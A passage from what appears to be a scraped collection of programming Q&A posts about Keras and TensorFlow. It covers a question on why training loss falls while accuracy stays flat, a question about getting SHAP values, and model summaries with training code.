…
ease, or the network will overfit and the validation loss and accuracy won't change much. Either way, shouldn't the loss and its corresponding accuracy value be directly linked and move inversely to each other?Also, I notice that my validation loss is always less than my normal loss, which seems wrong to me.Here's the loss (Normal: Blue, Validation: Green)Here's the accuracy (Normal: Black, Validation: Yellow): <code>  _________________________________________________________________Layer (type) Output Shape Param #=================================================================dense (Dense) (None, 90, 256) 1536_________________________________________________________________elu (ELU) (None, 90, 256) 0_________________________________________________________________flatten (Flatten) (None, 23040) 0_________________________________________________________________dropout (Dropout) (None, 23040) 0_________________________________________________________________dense_1 (Dense) (None, 1024) 23593984_________________________________________________________________elu_1 (ELU) (None, 1024) 0_________________________________________________________________dropout_1 (Dropout) (None, 1024) 0_________________________________________________________________dense_2 (Dense) (None, 512) 524800_________________________________________________________________elu_2 (ELU) (None, 512) 0_________________________________________________________________dropout_2 (Dropout) (None, 512) 0_________________________________________________________________dense_3 (Dense) (None, 512) 262656_________________________________________________________________elu_3 (ELU) (None, 512) 0_________________________________________________________________dropout_3 (Dropout) (None, 512) 0_________________________________________________________________dense_4 (Dense) (None, 256) 131328_________________________________________________________________activation (Activation) (None, 256) 0_________________________________________________________________dense_5 (Dense) (None, 2) 514_________________________________________________________________activation_1 (Activation) (None, 2) 0_________________________________________________________________Total params: 24,514,818Trainable params: 24,514,818Non-trainable params: 0_________________________________________________________________",Why would the loss decrease while the accuracy stays the same?
Getting shap values instead of a chart," I used shap to determine the feature importance for multiple regression with correlated f
…
ers=1, kernel_size=1)(expand_dims_layer) relu_layer_2 = ReLU()(conv1d_layer) reshape_layer_2 = Lambda(lambda x: K.squeeze(x, 1))(relu_layer_2) out = Dense(units=2, activation='softmax')(reshape_layer_2) return Model(inputs=[input_layer], outputs=[out]) clf_model = create_model()clf_model.compile(optimizer=Adam(), loss='categorical_crossentropy', metrics=['accuracy', 'categorical_crossentropy']) Model: ""model""_________________________________________________________________Layer (type) Output Shape Param # =================================================================input_1 (InputLayer) [(None, 6, 16, 16, 16, 3) 0 _________________________________________________________________lambda (Lambda) (None, 16, 16, 16, 3) 0 _________________________________________________________________conv3d (Conv3D) (None, 8, 8, 8, 64) 98368 _________________________________________________________________re_lu (ReLU) (None, 8, 8, 8, 64) 0 _________________________________________________________________global_average_pooling3d (Gl (None, 64) 0 _________________________________________________________________lambda_1 (Lambda) (None, 384) 0 _________________________________________________________________lambda_2 (Lambda) (None, 1, 384) 0 _________________________________________________________________conv1d (Conv1D) (None, 1, 1) 385 _________________________________________________________________re_lu_1 (ReLU) (None, 1, 1) 0 _________________________________________________________________lambda_3 (Lambda) (None, 1) 0 _________________________________________________________________dense (Dense) (None, 2) 4 =================================================================Total params: 98,757Trainable params: 98,757Non-trainable params: 0 train_ds = make_tfdataset(for_training=True)history = clf_model.fit(train_ds, epochs=500, steps_per_epoch=ceil(240 / BATCH_SIZE), verbose=1) import numpy as npimport tensorflow as tfimport tensorflow.keras.backend as Kfrom math import ceilfrom tensorflow.keras.layer
…
